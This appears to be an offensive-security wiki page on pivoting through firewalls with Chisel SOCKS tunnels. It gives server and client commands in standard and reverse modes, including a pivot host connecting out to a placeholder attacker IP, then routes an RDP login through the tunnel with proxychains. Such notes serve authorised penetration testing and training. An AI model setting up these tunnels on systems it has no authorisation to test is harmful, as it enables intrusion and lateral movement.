---
title: SOCKS Tunneling with Chisel
description: Use Chisel to tunnel traffic via HTTP.
categories: [Tunneling]
tags: [Tunneling, Chisel]
weight: 2
---

[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP tunneling tool transported via HTTP and and secured with SSH. It can help create a client-server tunnel in a firewall-restricted environment. Chisel then creates a SOCKS proxy that can be used to tunnel system traffic.

## Standard Tunneling
After obtaining the binary either through direct download or building manually, we want to transfer the `chisel` binary to the pivot host, where we would run `chisel` as server.
```bash
./chisel server -v -p <socks_listen_port>
```

Now, we run `chisel` on the attacker machine in client mode, create a TCP/UDP tunnel connection.
```bash
./chisel client -v <pivot_ip>:<socks_listen_port> socks
```

## Reverse Tunneling
If firewall rules restricts inbound connection to the pivot machine, we can use Chisel to establish a reverse connection instead where we first start our server on the attacker machine.
```bash
./chisel server --reverse -v -p <socks_listen_port> --socks5
```

Then, we connect as client from the pivot machine.
```bash
./chisel client -v <attacker_ip>:<socks_listen_port> R:socks
```

## Using SOCKS proxy
**Proxychains** may be used to route system commands through the SOCKS proxy established by chisel. Whether Chisel is ran in standard or reverse mode, a SOCKS5 listener is established on `localhost:1080` of the attacker machine.

At the very end of `/etc/proxychains.conf` is the a list of proxies Proxychains will attempt to use in sequence. We configure Proxychains to make use of the Chisel local SOCKS5 listener like so:
```txt
[ProxyList]
socks5 127.0.0.1 1080
```

Now, we may prepend `proxychains` to every command we wish to run through the SOCKS5 tunnel. Optionally, we use `-q` to have `proxychains` operate in quiet mode, suppressing output regarding tunnel connections.
```bash
proxychains -q xfreerdp /v:10.10.0.4 /u:amuro.ray /p:Password1
```
